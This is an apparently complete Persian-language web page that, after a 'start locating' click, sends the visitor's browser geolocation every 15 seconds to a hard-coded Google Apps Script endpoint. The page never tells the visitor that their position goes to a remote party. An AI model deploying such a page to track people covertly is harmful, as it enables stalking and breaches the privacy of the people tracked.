<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>مکان‌یابی آنلاین</title>
  <style>
    body {
      background: linear-gradient(to right, #8e2de2, #4a00e0);
      color: white;
      font-family: 'Tahoma', sans-serif;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 20px;
    }

    button {
      background-color: #ff0066;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 1rem;
      border-radius: 30px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #cc0052;
    }
  </style>
</head>
<body>
  <h1>برای آغاز، روی دکمه زیر کلیک کنید</h1>
  <button onclick="startTracking()">آغاز مکان‌یابی</button>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbxUDkRLW2Gg9xoDyyj_QzQ42E8-eLjGn-1IN45DU7htBPy9NAKLt7iywk2Q_3QEbKUO/exec";

    function startTracking() {
      if ("geolocation" in navigator) {
        setInterval(() => {
          navigator.geolocation.getCurrentPosition(async position => {
            const data = {
              lat: position.coords.latitude,
              lng: position.coords.longitude,
              time: new Date().toLocaleString()
            };

            try {
              const response = await fetch(scriptURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
              });

              if (!response.ok) {
                throw new Error('خطا در ارسال داده‌ها');
              }
            } catch (error) {
              console.error("خطا در ارسال موقعیت:", error);
              alert('مشکلی در ارسال موقعیت شما پیش آمده است.');
            }
          }, error => {
            console.error("خطا در دریافت موقعیت:", error);
            alert('خطا در دریافت موقعیت. لطفا دسترسی مکان‌یابی را بررسی کنید.');
          });
        }, 15000); // هر ۱۵ ثانیه
      } else {
        alert("مرورگر شما از مکان‌یابی پشتیبانی نمی‌کند.");
      }
    }
  </script>
</body>
</html>
